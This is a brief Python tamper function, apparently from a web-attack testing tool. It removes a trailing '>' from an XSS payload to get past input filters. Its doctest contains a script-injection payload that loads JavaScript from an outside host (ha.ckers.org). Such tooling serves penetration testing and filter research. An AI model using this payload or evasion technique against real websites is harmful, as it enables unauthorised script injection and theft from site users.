# -*- coding: utf-8 -*
import re
from main_modules.settings import PRIORITY
__priority__ = PRIORITY.LOW




def tamper(payload, **kwargs):
    """
    >>> tamper("<SCRIPT SRC=http://ha.ckers.org/xss.js>")
<SCRIPT SRC=http://ha.ckers.org/xss.js
    """
    string=re.sub(r">$",'',str(payload))

    return (string) if payload else payload


